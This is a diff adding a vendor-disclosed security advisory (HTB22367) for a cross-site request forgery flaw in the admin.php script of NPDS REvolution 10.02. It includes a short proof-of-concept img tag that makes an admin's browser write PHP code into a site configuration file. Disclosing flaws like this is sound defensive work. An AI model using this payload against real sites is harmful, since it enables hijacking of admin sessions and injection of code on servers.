@@ -1,0 +1,39 @@
+Vulnerability ID: HTB22367
+
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_npds_revolution.html
+
+Product: NPDS REvolution
+
+Vendor: NPDS
+
+Vulnerable Version: REvolution 10.02 and Probably Prior Versions Vendor
+Notification: 06 May 2010 Vulnerability Type: CSRF (Cross-Site Request
+Forgery)
+
+Status: Fixed by Vendor
+
+Risk level: Low
+
+Credit: High-Tech Bridge SA (http://www.htbridge.ch/)
+
+
+
+Vulnerability Details:
+
+The vulnerability exists due to failure in the "admin.php" script to
+properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise
+of the application, theft of cookie-based authentication credentials,
+disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is
+available:
+
+
+<img src="
+http://host/admin.php?op=ConfigFiles_save&Xtxt=<?+phpinfo()+?>&Xfiles=footer_after&confirm=1<http://host/admin.php?op=ConfigFiles_save&Xtxt=%3c?+phpinfo()+?%3e&Xfiles=footer_after&confirm=1>
+">
+
+
+Solution: Upgrade to the most recent verison
